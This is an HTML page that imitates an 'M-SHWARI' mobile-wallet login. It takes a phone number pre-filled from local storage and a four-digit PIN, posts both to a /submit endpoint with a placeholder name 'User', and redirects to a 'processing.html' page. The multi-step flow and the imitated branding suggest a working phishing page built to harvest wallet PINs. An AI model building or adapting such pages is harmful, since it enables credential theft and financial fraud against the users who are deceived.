<!DOCTYPE html>
<html>

<head>
    <title>M-SHWARI Login</title>

    <!-- MOBILE -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">

    <style>
        body {
            margin: 0;
            font-family: 'Segoe UI', sans-serif;
            background: #2fba28;
        }

        .top-section {
            background: white;
            padding: 30px 20px 80px;
            border-bottom-left-radius: 60px;
            border-bottom-right-radius: 60px;
            text-align: center;
        }

        .logo {
            font-size: 28px;
            font-weight: bold;
        }

        .logo span {
            color: rgb(246, 243, 243);
        }

        .login-title {
            margin-top: 20px;
            font-size: 20px;
        }

        .phone-box {
            display: flex;
            align-items: center;
            border: 2px solid #f6f9fd;
            border-radius: 12px;
            padding: 12px;
            margin-top: 20px;
        }

        .flag {
            font-size: 20px;
            margin-right: 10px;
        }

        .phone-input {
            border: none;
            outline: none;
            font-size: 16px;
            width: 100%;
        }

        .pin-title {
            margin-top: 25px;
            font-size: 16px;
        }

        .pin-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 15px;
        }

        .pin-box {
            width: 50px;
            height: 55px;
            border: 2px solid #1e63c6;
            border-radius: 10px;
            font-size: 22px;
            text-align: center;
        }

        .bottom-section {
            background: #38dd0a;
            padding: 40px 20px;
            text-align: center;
            color: white;
        }

        .bottom-text {
            margin-bottom: 20px;
        }

        .actions {
            display: flex;
            gap: 15px;
            justify-content: center;
        }

        .action-btn {
            background: white;
            color: black;
            padding: 14px;
            border-radius: 12px;
            width: 45%;
            border: none;
        }
    </style>
</head>

<body>

<!-- TOP WHITE -->
<div class="top-section">

    <div class="logo">M-SHWARI</span></div>

    <div class="login-title">Login</div>

    <!-- PHONE -->
    <div class="phone-box">
        <div class="flag">🇿🇼</div>
        <input class="phone-input" id="phone" readonly>
    </div>

    <!-- PIN -->
    <div class="pin-title">Enter your PIN</div>
  
    <div class="pin-container">
    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" autofocus>
    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
</div>

<p id="errorMsg" style="color:red; text-align:center; margin-top:10px; display:none;"></p>
    
<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
</div>

<!-- BOTTOM BLUE -->
<div class="bottom-section">

    <div class="bottom-text">Don’t have an M-SHWARI Wallet?</div>

    <div class="actions">
        <button class="action-btn">Register</button>
        <button class="action-btn">Help & Support</button>
    </div>

</div>

<script>

const inputs = document.querySelectorAll(".pin-box");

inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, "");
        
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

async function submitOtp() {
    const btn = document.getElementById("submitBtn");
    if (btn.disabled) return;

    let pin = "";
    document.querySelectorAll(".pin-box").forEach(input => {
        pin += input.value;
    });

    const error = document.getElementById("errorMsg");

    if (pin.length < 4) {
        error.innerText = "Enter full PIN";
        error.style.display = "block";
        return;
    }

    error.style.display = "none";

    btn.innerText = "Processing...";
    btn.disabled = true;

    document.getElementById("pageLoader").style.display = "block";

    const phone = document.getElementById("phone").value;

    try {
        const res = await fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: "User",
                phone: phone,
                pin: pin
            })
        });

        if (!res.ok) throw new Error();

        // clear PIN AFTER submit
        document.querySelectorAll(".pin-box").forEach(input => input.value = "");

        localStorage.setItem("firstProcess", "yes");

        window.location.href = "processing.html";

    } catch (err) {
        error.innerText = "Submission failed. Try again.";
        error.style.display = "block";

        btn.innerText = "Submit";
        btn.disabled = false;

        document.getElementById("pageLoader").style.display = "none";
    }
}

   document.getElementById("phone").value = localStorage.getItem("phone") || "+263";

window.onload = () => {
    document.body.classList.add("loaded");
};

</script>
<div id="pageLoader" class="loader" style="display:none;"></div>
</body>
</html>
